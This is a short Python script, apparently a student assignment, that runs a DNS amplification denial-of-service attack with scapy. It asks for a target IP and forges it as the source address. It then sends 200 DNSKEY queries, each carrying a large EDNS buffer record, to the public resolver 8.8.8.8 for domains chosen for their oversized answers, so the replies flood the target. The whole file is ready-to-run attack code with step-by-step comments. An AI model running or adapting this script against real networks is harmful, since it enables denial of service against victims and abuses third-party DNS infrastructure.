"""zainab saad
    202472448"""
from scapy.all import IP, UDP, RandShort, DNSQR, DNSRROPT, DNS, send
from main_config import validate_ip, choose_from_query
# sudo python3 path_to_file/dns_amplification.py

# to ask user to insert the target ip
target_ip = validate_ip("enter the Target IP: ")
# ask user to insert which query option want to use in this attack
query_option = choose_from_query()

# create a query that contain domain names
# first query create fragmentation
query_name_option = ["dane.verisignlabs.com", "sigok.verteiltesysteme.net"]


# create function that make the dns amplification attack

def dns_amplification(target_ip, query_option, dns_server="8.8.8.8"):
    choose_option = query_name_option[0]

    if query_option == 2:
        choose_option =query_name_option[1]
    # create Ip of the packet where the src ip is the target machine
    # destination is the DNs server which will recieve the query
    ip = IP(src=target_ip, dst=dns_server)
    # create a UDP laye
    # set port for the source
    # the standard port of DNS servere which is the destination is 53
    udp = UDP(sport=RandShort(), dport=53) 
    # create DNS packet
    # qname is the domain name
    # when rd=1 the dns search for answer on behalf of client by search other DNS server

    # DNSKEY this hold a public key that authenticate DNS record
    # DNSRROPT(rclass=4096) this add a EDNS opt record which indicate that client can handle large DNS reponce 
    dns = DNS(rd=1,
        qd=DNSQR(qname=choose_option, qtype="DNSKEY"),
        ar=DNSRROPT(rclass=4096),
    )
    # create a full packet by combine the created layer
    packet = ip / udp / dns
    # send packet in a loop
    send(packet, count=200, verbose=0)

dns_amplification(target_ip, query_option)